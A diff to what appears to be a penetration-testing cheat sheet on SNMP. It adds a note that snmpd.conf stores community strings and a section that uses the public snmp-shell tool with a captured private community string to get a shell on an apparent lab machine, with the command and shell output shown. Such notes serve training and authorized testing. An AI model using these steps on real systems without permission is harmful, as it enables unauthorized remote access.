@@ -35,6 +35,14 @@ snmpwalk -v2c -c public 192.168.1.234
 -c = the public string (default public) 
 ```
 
+### SNMP Config
+
+Snmp configuration file is located by default in:
+
+`/etc/snmp/snmpd.conf`
+
+and it includes the passwords for the community and private string.
+
 ### Brute force community string
 
 ```text
@@ -66,6 +74,19 @@ msf5 auxiliary(scanner/snmp/snmp_enumusers) > run
 [+] 192.168.0.41:161 Found 6 users: daemon, jack, noaccess, nobody, root, smmsp 
 [*] Scanned 1 of 1 hosts (100% complete) 
 [*] Auxiliary module execution completed
+```
+
+### SNMP Shell
+
+Using Net-SNMP functionality we can gain shell on a SNMP server
+
+Link: [https://github.com/mxrch/snmp-shell](https://github.com/mxrch/snmp-shell)
+
+```text
+root@kali# rlwrap python3 /opt/snmp-shell/shell.py 10.10.10.195 -c SuP3RPrivCom90
+
+Debian-snmp@intense:/$ id
+uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)
 ```
 
 ### SNMP IPv6 Enumeration 
